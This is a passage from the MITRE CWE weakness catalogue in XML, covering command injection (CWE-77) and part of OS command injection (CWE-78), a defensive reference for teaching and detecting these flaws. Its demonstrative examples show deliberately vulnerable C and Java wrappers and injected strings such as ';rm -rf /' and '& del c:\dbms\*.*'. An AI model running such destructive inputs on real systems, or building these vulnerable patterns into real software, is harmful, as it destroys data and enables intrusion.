               <xhtml:div>3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.</xhtml:div>
            </xhtml:div>
            <xhtml:p>Many protocols and products have their own custom command language. While OS or shell command strings are frequently discovered and targeted, developers may not realize that these other command languages might also be vulnerable to attacks.</xhtml:p>
            <xhtml:p>Command injection is a common problem with wrapper programs.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>If a malicious user injects a character (such as a semi-colon) that delimits the end of one command and the beginning of another, it may be possible to then insert an entirely new and unrelated command that was not intended to be executed.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If at all possible, use library calls rather than external processes to recreate the desired functionality.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If possible, ensure that all external commands called from the program are statically created.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>Run time: Run time policy enforcement may be used in an allowlist fashion to prevent use of any non-sanctioned commands.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Assign permissions that prevent the user from accessing/opening privileged files.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-30">
               <Intro_Text>The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int main(int argc, char** argv) {<xhtml:div style="margin-left:1em;">char cmd[CMD_MAX] = "/usr/bin/cat ";<xhtml:br/>strcat(cmd, argv[1]);<xhtml:br/>system(cmd);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.</Body_Text>
               <Body_Text>Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-28">
               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String btype = request.getParameter("backuptype");<xhtml:br/>String cmd = new String("cmd.exe /K \"<xhtml:div style="margin-left:1em;">c:\\util\\rmanDB.bat "<xhtml:br/>+btype+<xhtml:br/>"&amp;&amp;c:\\utl\\cleanup.bat\"")</xhtml:div>
                     <xhtml:br/>System.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-11">
               <Intro_Text>The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String home = System.getProperty("APPHOME");<xhtml:br/>String cmd = home + INITCMD;<xhtml:br/>java.lang.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The code above allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="SIFT-DX-12">
               <Intro_Text>The following code is a wrapper around the UNIX command cat which prints the contents of a file to standard out. It is also injectable:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>#include &lt;stdio.h&gt;<xhtml:br/>#include &lt;unistd.h&gt;<xhtml:br/>
                     <xhtml:br/>int main(int argc, char **argv) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>char cat[] = "cat ";<xhtml:br/>char *command;<xhtml:br/>size_t commandLength;<xhtml:br/>
                           <xhtml:br/>commandLength = strlen(cat) + strlen(argv[1]) + 1;<xhtml:br/>command = (char *) malloc(commandLength);<xhtml:br/>strncpy(command, cat, commandLength);<xhtml:br/>strncat(command, argv[1], (commandLength - strlen(cat)) );<xhtml:br/>
                           <xhtml:br/>system(command);<xhtml:br/>return (0);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Used normally, the output is simply the contents of the file requested:</Body_Text>
               <Example_Code Nature="Informative">
                  <xhtml:div>$ ./catWrapper Story.txt<xhtml:br/>When last we left our heroes...</xhtml:div>
               </Example_Code>
               <Body_Text>However, if we add a semicolon and another command to the end of this line, the command is executed by catWrapper with no complaint:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>$ ./catWrapper Story.txt; ls<xhtml:br/>When last we left our heroes...<xhtml:br/>Story.txt<xhtml:br/>SensitiveFile.txt<xhtml:br/>PrivateData.db<xhtml:br/>a.out*</xhtml:div>
               </Example_Code>
               <Body_Text>If catWrapper had been set to have a higher privilege level than the standard user, arbitrary commands could be executed with that higher privilege.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-36069</Reference>
               <Description>Python-based dependency management tool avoids OS command injection  when generating Git commands but allows  injection of optional arguments with input beginning with a dash, potentially allowing for code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-36069</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0067</Reference>
               <Description>Canonical example of OS command injection. CGI program does not neutralize "|" metacharacter when invoking a phonebook program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-0067</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-9054</Reference>
               <Description>Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-9054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-1509</Reference>
               <Description>injection of sed script syntax ("sed injection")</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-1509</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-41282</Reference>
               <Description>injection of sed script syntax ("sed injection")</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-41282</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-13398</Reference>
               <Description>injection of sed script syntax ("sed injection")</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-13398</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-12921</Reference>
               <Description>image program allows injection of commands in "Magick Vector Graphics (MVG)" language.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-12921</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-11698</Reference>
               <Description>anti-spam product allows injection of SNMP commands into confiuration file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-11698</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Command Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Command injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <Entry_ID>IDS34-PL</Entry_ID>
               <Entry_Name>Do not pass untrusted, unsanitized data to a command interpreter</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="136"/>
            <Related_Attack_Pattern CAPEC_ID="15"/>
            <Related_Attack_Pattern CAPEC_ID="183"/>
            <Related_Attack_Pattern CAPEC_ID="248"/>
            <Related_Attack_Pattern CAPEC_ID="40"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="75"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-140"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 10: Command Injection.&#34; Page 171"/>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>CWE-77 is often misused when OS command injection (CWE-78) was intended instead [REF-1287].</Rationale>
            <Comments>If the weakness involves a command language besides OS shell invocation, then CWE-77 could be used.</Comments>
            <Reasons>
               <Reason Type="Frequent Misuse"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Terminology">
               <xhtml:p>The "command injection" phrase carries different meanings to different people. For some people, it refers to any type of attack that can allow the attacker to execute commands of their own choosing, regardless of how those commands are inserted. The command injection could thus be resultant from another weakness. This usage also includes cases in which the functionality allows the user to specify an entire command, which is then executed; within CWE, this situation might be better regarded as an authorization problem (since an attacker should not be able to specify arbitrary commands.)</xhtml:p>
               <xhtml:p>Another common usage, which includes CWE-77 and its descendants, involves cases in which the attacker injects separators into the command being constructed.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Other_Notes, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Other_Notes, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Description, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References, Terminology_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Feedback">
               <Contribution_Name>Anonymous External Contributor</Contribution_Name>
               <Contribution_Date>2022-05-20</Contribution_Date>
               <Contribution_Comment>reported typo in Terminology note</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2008-04-11">Command Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Sanitize Data into a Control Plane (aka 'Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-07-27">Failure to Sanitize Data into a Control Plane ('Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Improper Sanitization of Special Elements used in a Command ('Command Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="78" Name="Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>This could allow attackers to execute unexpected, dangerous commands directly on the operating system. This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage.</xhtml:p>
            <xhtml:p>There are at least two subtypes of OS command injection:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system("nslookup [HOSTNAME]") to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.</xhtml:li>
                  <xhtml:li>The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use "exec([COMMAND])" to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.</xhtml:li>
               </xhtml:ul>
            <xhtml:p>From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1305" Ordinal="Primary"/>
			 <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1340" Ordinal="Primary"/>
             <Related_Weakness Nature="CanAlsoBe" CWE_ID="88" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Shell injection</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Shell metacharacters</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Hide Activities</Impact>
               <Note>Attackers could execute unauthorized commands, which could then be used to disable the product, or read and modify data for which the attacker does not have permissions to access directly. Since the targeted application is directly executing the commands instead of the attacker, any malicious activities may appear to come from the application or the application's owner.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke OS commands, leading to false negatives - especially if the API/library code is not available for analysis.</xhtml:p>
               </Description>
               <Effectiveness_Notes>This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method>Manual Static Analysis</Method>
               <Description>Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
